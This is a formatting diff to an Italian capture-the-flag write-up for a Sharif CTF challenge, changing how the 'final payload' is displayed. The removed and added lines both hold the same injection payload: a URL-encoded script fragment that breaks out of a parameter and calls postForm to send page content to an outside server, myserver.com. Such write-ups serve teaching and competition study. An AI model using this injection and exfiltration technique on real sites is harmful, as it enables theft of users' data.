@@ -93,9 +93,7 @@ Una volta scoperto che effettivamente il filtro falliva a processare qualsiasi c
 
 Il payload finale quindi consisteva in:
 
-```
-http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1
-```
+`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`
 
 Che risulta nel seguente codice:
 
